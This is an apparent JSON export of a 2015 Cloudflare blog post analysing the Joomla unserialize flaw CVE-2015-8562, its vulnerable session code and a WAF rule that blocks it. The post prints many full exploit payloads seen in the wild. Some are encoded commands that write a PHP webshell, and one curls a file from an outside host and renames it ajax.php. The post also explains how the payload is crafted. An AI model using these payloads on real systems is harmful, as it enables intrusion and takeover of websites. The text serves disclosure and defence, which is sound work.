{
	"initialReadingTime": "4",
	"locale": "en-us",
	"localesAvailable": [],
	"post": {
		"authors": [
			{
				"name": "Pasha Kravtsov",
				"slug": "pasha-kravtsov",
				"bio": null,
				"profile_image": "https://cf-assets.www.cloudflare.com/slt3lc6tev37/1kxwlg4kCrr3Ls2h8gJCua/883f445c7798412806279315786d89bc/pasha-kravtsov.jpg",
				"location": null,
				"website": null,
				"twitter": null,
				"facebook": null
			}
		],
		"excerpt": "At CloudFlare, we spend a lot of time talking about the PoPs (Points of Presence) we have around the globe, however, on December 14th, another kind of POP came to the world: a vulnerability being exploited in the wild against Joomla’s Content Management System.",
		"feature_image": "https://cf-assets.www.cloudflare.com/slt3lc6tev37/6XXB0CFsBp9UvAqxzrK5i2/1c4e58d37fc5fc838a7b6b55cca3bae8/the-joomla-unserialize-vulnerability.png",
		"featured": false,
		"html": "<p>At CloudFlare, we spend a lot of time talking about the PoPs (Points of Presence) we have around the globe, however, on December 14th, another kind of POP came to the world: a vulnerability being exploited in the wild against Joomla’s Content Management System. This is known as a zero day attack, where it has been zero days since a patch has been released for that bug. A CVE ID has been issued for this particular vulnerability as <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8562\">CVE-2015-8562</a>. Jaime Cochran and I decided to take a closer look.</p>\n            <figure class=\"kg-card kg-image-card \">\n            \n            <Image src=\"https://cf-assets.www.cloudflare.com/slt3lc6tev37/1JFk6wEd8uVYQDXsCuufJL/fd8ed01a5e6c6d3dc6fe03ed9115b552/joomla-unserialize-vulnerability.png\" alt=\"The Joomla unserialize vulnerability\" class=\"kg-image\" width=\"656\" height=\"349\" loading=\"lazy\"/>\n            \n            </figure><p>In this blog post we’ll explain what the vulnerability is, give examples of actual attack payloads we’ve seen, and show how CloudFlare automatically protects Joomla users. If you are using Joomla with CloudFlare today and have our WAF enabled, you are already protected.</p><p>The Joomla Web Application Firewall rule set is enabled by default for CloudFlare customers with a Pro or higher plan, which blocks this attack. You can find it in the Joomla section of the CloudFlare Rule Set in the WAF Dashboard.</p>\n            <figure class=\"kg-card kg-image-card \">\n            \n            <Image src=\"https://cf-assets.www.cloudflare.com/slt3lc6tev37/4hZkDzu55IzpvOOEgmEOQW/99905e4212b7b4cb8ed4dd8ebee614ed/waf-rule-for-joomla-unserialize-vuln.png\" alt=\"The WAF rule for protecting against the Joomla Unserialize Vulnerability\" class=\"kg-image\" width=\"1600\" height=\"723\" loading=\"lazy\"/>\n            \n            </figure><h3>What is Joomla?</h3><p><a href=\"https://www.joomla.org/\">Joomla</a> is an open source Content Management System which allows you to build web applications and control every aspect of the content of your website. Some of these resources include photos, videos, text, and documents to name just a few. As one can imagine, this is a high value target if an attacker can gain access to the admin control panel.</p><h3>The Unserialize Vulnerability</h3><p>The vulnerability is a bug class that is inherent in most languages including Java, Python’s pickle, C’s unmarshalling, Ruby (<a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-0333\">CVE-2013-0333</a>), and many others. This class of vulnerability is not new but has recently piqued the security world’s interest after an excellent <a href=\"http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/\">blog written by @breenmachine</a> was published. Like many vulnerabilities in CMS/framework software, remote code execution is achieved, meaning a usually unauthenticated attacker can execute arbitrary code from afar, leading to the acquisition of sensitive information, a shell, and eventually a full system compromise.</p><p>So how is remote code execution achieved? There are two poorly sanitized inputs that can be controlled by a user, one being the <code>User-Agent</code> header and the other being the <code>X-Forwarded-For</code> header, which are then stored as part of the <code>session.client.browser</code> and <code>session.client.forwarded</code> objects, serialized, and inserted in Joomla’s MySQL database.</p><p>These request headers must contain malicious data known as a &quot;POP Chain&quot; (Property Oriented Programming). POP chains, similar to their older cousin ROP (Return Oriented Programming) are constructed of a series of “magic PHP methods” that already exist in the code, which is why these kinds of attacks are often referred to as code reuse. An attacker must link these methods together in order to achieve their desired code execution.</p><p>The POP chain is then sent from the attacker in either the <code>User-Agent</code> or <code>X-Forwarded-For header</code>, the attacker saves the session cookie that is returned upon completion of the request. From what we have noticed, most of these POP chains run <code>eval()</code> on the POST data, but not all of them, as you can also run a <code>chr()</code> encoded string into <code>eval()</code> that will execute all the bad PHP calls: <code>system()</code>, <code>popen()</code>, <code>exec()</code>, <code>passthru()</code>, <code>shell_exec()</code>, etc. Here is an example of part of the exploit payload:</p>\n            <pre class=\"language-bash\"><code class=\"language-bash\">eval(base64_decode($_POST[111]))</pre></code>\n            <p>Now, you may be wondering how this is exploited if the initial request isn’t a POST request. That is the next part of the exploit, after grabbing the session cookie value, the attacker sends a subsequent request with the session cookie set. The previous request’s <code>User-Agent</code> or <code>X-Forwarded-For</code> header was inserted into the MySQL database and is unserialized on the subsequent request. The trick is appending four UTF-8 characters to the end of the payload (such as: <code>\\xf0\\xfd\\xfd\\xfd</code>) which will truncate the payload, allowing the code to execute. Crafting a successful payload also involves calculating the size of the payload and inserting it before the eval() as such:</p>\n            <pre class=\"language-bash\"><code class=\"language-bash\">s:221:&quot;eval(base64_decode($_POST[111]))</pre></code>\n            <p>or the exploit will fail. We have been able to successfully exploit both the vulnerable headers, using multiple variations of POP chains in our test environment.</p><p>More importantly, we’ve been able to block them too.</p><h3>The Vulnerable Code</h3><p>In this section, we’ll go through the code path taken to exploit this vulnerability starting with <a href=\"https://github.com/joomla/joomla-cms/blob/3.5-dev/libraries/joomla/session/session.php\">session.php</a>, where sessions are created. If you look at lines 909 and 932, you will see that the unsanitized <code>User-Agent</code> and <code>X-Forwarded-For</code> headers are set to <code>session.client.browser</code> and <code>session.client.forwarded</code>.</p>\n            <pre class=\"language-bash\"><code class=\"language-bash\">909: if (isset($_SERVER[&#039;HTTP_X_FORWARDED_FOR&#039;]))\n910: {\n911:        $this-&gt;set(&#039;session.client.forwarded&#039;, $_SERVER[&#039;HTTP_X_FORWARDED_FOR&#039;]);\n912: }\n\t\t\t\t\t\n\n&lt;--&gt;\n\n932: if (in_array(&#039;fix_browser&#039;, $this-&gt;_security) &amp;&amp; isset($_SERVER[&#039;HTTP_USER_AGENT&#039;]))\n933: {\n934:\t\t\t$browser = $this-&gt;get(&#039;session.client.browser&#039;);\n935:       if ($browser === null)\n936:       {\n937:\t \t\t$this-&gt;set(&#039;session.client.browser&#039;, $_SERVER[&#039;HTTP_USER_AGENT&#039;]);\n938:       }</pre></code>\n            <p>PHP has a unique way of handling sessions, which actually serializes and deserializes session objects: <a href=\"http://php.net/manual/en/function.session-set-save-handler.php\">PHP’s session handler object</a> is created and saved here:</p>\n            <pre class=\"language-bash\"><code class=\"language-bash\">public function write($id, $data)\n\n{\n\n\ttry\n\n\t{\n\n\t\t$query = $this-&gt;db-&gt;getQuery(true);\n\n\t\t$query-&gt;update($this-&gt;db-&gt;quoteName(&#039;#__session&#039;))\n\n\t\t-&gt;set($this-&gt;db-&gt;quoteName(&#039;data&#039;) . &#039; = &#039; . $this-&gt;db-&gt;quote($data))\n\n\t\t-&gt;set($this-&gt;db-&gt;quoteName(&#039;time&#039;) . &#039; = &#039; . $this-&gt;db-&gt;quote((int) time()))\n\n\t\t-&gt;where($this-&gt;db-&gt;quoteName(&#039;session_id&#039;) . &#039; = &#039; . $this-&gt;db-&gt;quote($id));\n\n\t\t// Try to update the session data in the database table.\n\n\t\t$this-&gt;db-&gt;setQuery($query);\n\n\t\tif (!$this-&gt;db-&gt;execute())\n\n\t\t{\n\n\t\t\treturn false;\n\n\t\t}\n\n\t\t// Since $this-&gt;db-&gt;execute did not throw an exception the query was successful.\n\n\t\t// Either the data changed, or the data was identical. In either case we are done.\n\n\t\treturn true;\n\n\t}\n\n\tcatch (\\Exception $e)\n\n\t{\n\n\t\treturn false;\n\n\t}\n\n}</pre></code>\n            <p>and then popped from the database here:</p>\n            <pre class=\"language-bash\"><code class=\"language-bash\">public function read($id)\n\t  {\n\t\t  // Get the database connection object and verify its connected.\n\t\t  $db = JFactory::getDbo();\n\t\t  try\n\t\t  {\n\t\t\t  // Get the session data from the database table.\n\t\t\t  $query = $db-&gt;getQuery(true)\n\t\t\t\t  -&gt;select($db-&gt;quoteName(&#039;data&#039;))\n\t\t\t  -&gt;from($db-&gt;quoteName(&#039;#__session&#039;))\n\t\t\t  -&gt;where($db-&gt;quoteName(&#039;session_id&#039;) . &#039; = &#039; . $db-&gt;quote($id));\n\t\t\t  $db-&gt;setQuery($query);\n\t\t\t  $result = (string) $db-&gt;loadResult();\n\t\t\t  $result = str_replace(&#039;\\0\\0\\0&#039;, chr(0) . &#039;*&#039; . chr(0), $result);\n\t\t\t  return $result;\n\t\t  }\n\t\t  catch (Exception $e)\n\t\t  {\n\t\t\t  return false;\n\t\t  }\n\t  }</pre></code>\n            <p>As per the PHP documentation: &quot;The value returned will be unserialized automatically by PHP and used to populate the <code>$_SESSION</code> superglobal.&quot; So the <code>session_id</code> is pulled from the database, unserialized, and if the POP chain was constructed correctly, it will execute the malicious code.</p><h3>What we see with our Web Application Firewall</h3><p>After writing a ruleset specifically to block this attack and making it block by default for all our customers, we saw a very large number of requests that triggered the ruleset. This shows malicious actors trying to directly exploit Joomla installs:</p>\n            <figure class=\"kg-card kg-image-card \">\n            \n            <Image src=\"https://cf-assets.www.cloudflare.com/slt3lc6tev37/vnyQCbeUmTjjCER4Kj4V0/8f06b36a2079b0b8a3bd77f7d281d384/waf-activity-of-joomla-unserialize-vuln.png\" alt=\"WAF activity of the Joomla Unserialize Vulnerability\" class=\"kg-image\" width=\"1600\" height=\"318\" loading=\"lazy\"/>\n            \n            </figure><p>As you can see, the amount of requests that have been blocked spike greatly when public exploits were released. Here is a small sample of the different payloads we’re seeing since public exploits were released a day ago:</p>\n            <pre class=\"language-bash\"><code class=\"language-bash\">[ Payload ]:   123}__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:4:&quot;\\0\\0\\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\0\\0\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:221:&quot;eval(base64_decode(&#039;ellyel8&#039;));phpinfo();JFactory::getConfig();exit;&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\0\\0\\0connection&quot;;i:1;}?\n\n\n\n [ Payload ]:   123}__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:4:&quot;\\0\\0\\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\0\\0\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:221:&quot;eval(base64_decode(&#039;ZmlsZV9wdXRfY29udGVudHMoZGlybmFtZSgkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ10pLicvbGlicmFyaWVzL29uZV93b3JkLnBocCcsICc8P3BocCBldmFsKCRfUE9TVFtcJ2plcnJ5NDZcJ10pOz8+Jyk7&#039;));phpinfo();JFactory::getConfig();exit;&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\0\\0\\0connection&quot;;i:1;}?\n\n\n [ Payload ]:   123}__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:2:&quot;fc&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\0\\0\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:8:&quot;feed_url&quot;;s:60:&quot;eval(base64_decode($_POST[111]));JFactory::getConfig();exit;&quot;;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:5:&quot;cache&quot;;b:1;s:11:&quot;cache_class&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\0\\0\\0connection&quot;;b:1;}?\n\n\n[ Payload ]:   123}__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:4:&quot;\\0\\0\\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\0\\0\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:221:&quot;eval(base64_decode(&#039;ZmlsZV9wdXRfY29udGVudHMoZGlybmFtZSgkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ10pLicvbGlicmFyaWVzL29uZV93b3JkLnBocCcsICc8P3BocCBldmFsKCRfUE9TVFtcJ2plcnJ5NDZcJ10pOz8+Jyk7&#039;));phpinfo();JFactory::getConfig();exit;&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\0\\0\\0connection&quot;;i:1;}?\n\n [ Payload ]:   123}__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:4:&quot;\\0\\0\\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\0\\0\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:221:&quot;eval(base64_decode(&#039;ZmlsZV9wdXRfY29udGVudHMoZGlybmFtZSgkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ10pLicvbGlicmFyaWVzL29uZV93b3JkLnBocCcsICc8P3BocCBldmFsKCRfUE9TVFtcJ2plcnJ5NDZcJ10pOz8+Jyk7&#039;));phpinfo();JFactory::getConfig();exit;&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\0\\0\\0connection&quot;;i:1;}?\n\n [ Payload ]:   123}__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:4:&quot;\\0\\0\\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\0\\0\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:221:&quot;eval(base64_decode(&#039;ZmlsZV9wdXRfY29udGVudHMoZGlybmFtZSgkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ10pLicvbGlicmFyaWVzL29uZV93b3JkLnBocCcsICc8P3BocCBldmFsKCRfUE9TVFtcJ2plcnJ5NDZcJ10pOz8+Jyk7&#039;));phpinfo();JFactory::getConfig();exit;&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\0\\0\\0connection&quot;;i:1;}?\n\n [ Payload ]:   }__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:2:&quot;fc&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\0\\0\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:8:&quot;feed_url&quot;;s:60:&quot;eval(base64_decode($_POST[111]));JFactory::getConfig();exit;&quot;;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:5:&quot;cache&quot;;b:1;s:11:&quot;cache_class&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\0\\0\\0connection&quot;;b:1;}?\n\n [ Payload ]:   123}__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:4:&quot;\\0\\0\\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\0\\0\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:221:&quot;eval(base64_decode(&#039;ZmlsZV9wdXRfY29udGVudHMoZGlybmFtZSgkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ10pLicvbGlicmFyaWVzL29uZV93b3JkLnBocCcsICc8P3BocCBldmFsKCRfUE9TVFtcJ2plcnJ5NDZcJ10pOz8+Jyk7&#039;));phpinfo();JFactory::getConfig();exit;&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\0\\0\\0connection&quot;;i:1;}?\n\n\n [ Payload ]:   123}__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:4:&quot;\\0\\0\\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\0\\0\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:221:&quot;eval(base64_decode(&#039;ZmlsZV9wdXRfY29udGVudHMoZGlybmFtZSgkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ10pLicvbGlicmFyaWVzL29uZV93b3JkLnBocCcsICc8P3BocCBldmFsKCRfUE9TVFtcJ2plcnJ5NDZcJ10pOz8+Jyk7&#039;));phpinfo();JFactory::getConfig();exit;&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\0\\0\\0connection&quot;;i:1;}?\n\n [ Payload ]:   }__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:2:&quot;fc&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\0\\0\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:8:&quot;feed_url&quot;;s:954:&quot;eval(chr(115).chr(121).chr(115).chr(116).chr(101).chr(109).chr(40).chr(39).chr(99).chr(100).chr(32).chr(99).chr(111).chr(109).chr(112).chr(111).chr(110).chr(101).chr(110).chr(116).chr(115).chr(59).chr(99).chr(100).chr(32).chr(99).chr(111).chr(109).chr(95).chr(109).chr(101).chr(100).chr(105).chr(97).chr(59).chr(114).chr(109).chr(32).chr(45).chr(114).chr(102).chr(32).chr(107).chr(46).chr(116).chr(120).chr(116).chr(59).chr(99).chr(117).chr(114).chr(108).chr(32).chr(45).chr(79).chr(32).chr(104).chr(116).chr(116).chr(112).chr(58).chr(47).chr(47).chr(116).chr(105).chr(112).chr(116).chr(111).chr(112).chr(99).chr(111).chr(109).chr(46).chr(116).chr(118).chr(47).chr(98).chr(108).chr(111).chr(103).chr(47).chr(107).chr(46).chr(116).chr(120).chr(116).chr(59).chr(109).chr(118).chr(32).chr(107).chr(46).chr(116).chr(120).chr(116).chr(32).chr(97).chr(106).chr(97).chr(120).chr(46).chr(112).chr(104).chr(112).chr(39).chr(41).chr(59));JFactory::getConfig();exit&quot;;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:5:&quot;cache&quot;;b:1;s:11:&quot;cache_class&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\0\\0\\0connection&quot;;b:1;}\n\n [ Payload ]:   }__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:2:&quot;fc&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\0\\0\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:8:&quot;feed_url&quot;;s:954:&quot;eval(chr(115).chr(121).chr(115).chr(116).chr(101).chr(109).chr(40).chr(39).chr(99).chr(100).chr(32).chr(99).chr(111).chr(109).chr(112).chr(111).chr(110).chr(101).chr(110).chr(116).chr(115).chr(59).chr(99).chr(100).chr(32).chr(99).chr(111).chr(109).chr(95).chr(109).chr(101).chr(100).chr(105).chr(97).chr(59).chr(114).chr(109).chr(32).chr(45).chr(114).chr(102).chr(32).chr(107).chr(46).chr(116).chr(120).chr(116).chr(59).chr(99).chr(117).chr(114).chr(108).chr(32).chr(45).chr(79).chr(32).chr(104).chr(116).chr(116).chr(112).chr(58).chr(47).chr(47).chr(116).chr(105).chr(112).chr(116).chr(111).chr(112).chr(99).chr(111).chr(109).chr(46).chr(116).chr(118).chr(47).chr(98).chr(108).chr(111).chr(103).chr(47).chr(107).chr(46).chr(116).chr(120).chr(116).chr(59).chr(109).chr(118).chr(32).chr(107).chr(46).chr(116).chr(120).chr(116).chr(32).chr(97).chr(106).chr(97).chr(120).chr(46).chr(112).chr(104).chr(112).chr(39).chr(41).chr(59));JFactory::getConfig();exit&quot;;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:5:&quot;cache&quot;;b:1;s:11:&quot;cache_class&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\0\\0\\0connection&quot;;b:1;}\n\n [ Payload ]:   sjeua}__eusmxa|O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:4:&quot;\\0\\0\\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\0\\0\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:8:&quot;feed_url&quot;;s:61:&quot;eval(base64_decode($_POST[1111]));JFactory::getConfig();exit;&quot;;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:5:&quot;cache&quot;;b:1;s:11:&quot;cache_class&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\0\\0\\0connection&quot;;b:1;}\n\n [ Payload ]:   sjeua}__eusmxa|O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:4:&quot;\\0\\0\\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\0\\0\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:8:&quot;feed_url&quot;;s:61:&quot;eval(base64_decode($_POST[1111]));JFactory::getConfig();exit;&quot;;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:5:&quot;cache&quot;;b:1;s:11:&quot;cache_class&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\0\\0\\0connection&quot;;b:1;}\n\n\n [ Payload ]:   123}__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:4:&quot;\\0\\0\\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\0\\0\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:221:&quot;eval(base64_decode(&#039;ZmlsZV9wdXRfY29udGVudHMoZGlybmFtZSgkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ10pLicvbGlicmFyaWVzL29uZV93b3JkLnBocCcsICc8P3BocCBldmFsKCRfUE9TVFtcJ2plcnJ5NDZcJ10pOz8+Jyk7&#039;));phpinfo();JFactory::getConfig();exit;&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\0\\0\\0connection&quot;;i:1;}?\n\n\n [ Payload ]:   123}__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:4:&quot;\\0\\0\\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\0\\0\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:221:&quot;eval(base64_decode(&#039;ZmlsZV9wdXRfY29udGVudHMoZGlybmFtZSgkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ10pLicvbGlicmFyaWVzL29uZV93b3JkLnBocCcsICc8P3BocCBldmFsKCRfUE9TVFtcJ2plcnJ5NDZcJ10pOz8+Jyk7&#039;));phpinfo();JFactory::getConfig();exit;&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\0\\0\\0connection&quot;;i:1;}?\n\n [ Payload ]:   }__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:2:&quot;fc&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\0\\0\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:8:&quot;feed_url&quot;;s:59:&quot;eval(base64_decode($_POST[200]));JFactory::getConfig();exit&quot;;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:5:&quot;cache&quot;;b:1;s:11:&quot;cache_class&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\0\\0\\0connection&quot;;b:1;}?</pre></code>\n            <p>As you can see, there are a few different payloads being used. Specifically, the payloads using <code>chr()</code> in <code>eval()</code> are from the <a href=\"http://pastebin.com/PRiK0SWL\">public exploit released on PasteBin</a> yesterday, December 15th, along with a metasploit module. Some payloads translate to:</p>\n            <pre class=\"language-bash\"><code class=\"language-bash\">system(&#039;cd components;cd com_media;rm -rf k.txt;curl -O http://tiptopcom.tv/blog/k.txt;mv k.txt ajax.php&#039;);</pre></code>\n            <p>This is a simple example where an attacker tries to find a writable directory, retrieves a malicious file from a remote (most likely a compromised computer) and disguises it as a seemingly innocuous PHP file. The file is known as a webshell and gives the attacker a way to easily execute code and a very small amount of persistence. But, this is only a very basic example of what an attacker might do.</p><p>We have found some payloads that classically extract credentials from the Joomla configuration file or attempt to spawn a connectback shell, which is a technique that makes the target computer send an outbound connection to an attacker controlled computer, allowing them to operate as if they had terminal access to the computer. This is often used when a target does not have an attacker-friendly environment (such as properly jailed user accounts and read-only directories). The original zero day was using a webshell dropping payload that cleverly patched the <code>User-Agent</code> bug behind itself.</p><p>Since the first public exploit was released, our WAF has blocked 16,413 attacks and counting.</p>",
		"id": "1UuPRoiC85hckUH7JESUWq",
		"localeList": {
			"name": "A Different Kind of POP: The Joomla Unserialize Vulnerability Config",
			"enUS": "English for Locale",
			"zhCN": "No Page for Locale",
			"zhHansCN": "No Page for Locale",
			"zhTW": "No Page for Locale",
			"frFR": "No Page for Locale",
			"deDE": "No Page for Locale",
			"itIT": "No Page for Locale",
			"jaJP": "No Page for Locale",
			"koKR": "No Page for Locale",
			"ptBR": "No Page for Locale",
			"esLA": "No Page for Locale",
			"esES": "No Page for Locale",
			"enAU": "No Page for Locale",
			"enCA": "No Page for Locale",
			"enIN": "No Page for Locale",
			"enGB": "No Page for Locale",
			"idID": "No Page for Locale",
			"ruRU": "No Page for Locale",
			"svSE": "No Page for Locale",
			"viVN": "No Page for Locale",
			"plPL": "No Page for Locale",
			"arAR": "No Page for Locale",
			"nlNL": "No Page for Locale",
			"thTH": "No Page for Locale",
			"trTR": "No Page for Locale",
			"heIL": "No Page for Locale",
			"lvLV": "No Page for Locale",
			"etEE": "No Page for Locale",
			"ltLT": "No Page for Locale"
		},
		"meta_description": null,
		"metadata": {
			"imgPreview": ""
		},
		"primary_author": {},
		"published_at": "2015-12-17T18:05:00.000+00:00",
		"slug": "the-joomla-unserialize-vulnerability",
		"tags": [
			{
				"id": "2pFyOCtANFB5qS6nbtQbVp",
				"name": "Vulnerabilities",
